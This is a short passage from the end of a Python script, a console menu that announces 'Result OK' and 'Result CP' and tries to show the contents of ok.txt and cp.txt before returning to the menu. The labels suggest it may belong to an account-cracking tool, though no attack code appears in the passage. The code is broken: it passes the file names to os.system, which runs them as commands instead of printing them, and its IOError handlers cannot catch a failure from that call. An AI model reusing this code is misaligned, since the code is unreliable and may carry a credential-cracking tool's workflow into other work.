    print((p+"\n ["+h+"•"+p+"] Result OK "))
    try:
        os.system("ok.txt")
    except IOError:
        print((p+" ["+h+"•"+p+"] No Result Found"))
    print((p+" ["+h+"•"+p+"] Result CP"))
    try:
        os.system("cp.txt")
    except IOError:
        print((p+" ["+h+"•"+p+"] No Result Found"))
    input(p+" [Back]")
    menu()

if __name__=="__main__":
	menu()
